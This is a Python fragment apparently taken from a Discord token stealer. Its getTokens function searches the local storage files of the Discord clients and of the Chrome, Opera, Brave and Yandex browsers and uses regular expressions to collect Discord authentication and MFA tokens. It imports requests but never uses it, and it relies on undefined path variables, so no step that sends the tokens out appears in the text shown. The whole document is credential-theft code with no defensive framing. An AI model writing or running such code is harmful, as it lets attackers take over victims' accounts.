import os
import re
import requests

def getTokens():
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    tokens = []
    for platform,path in paths.items(): 
      path += '\\Local Storage\\leveldb'


      for file_name in os.listdir(path):
          if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
              continue

          for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
              for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                  for token in re.findall(regex, line):
                      tokens.append(token)
    return tokens
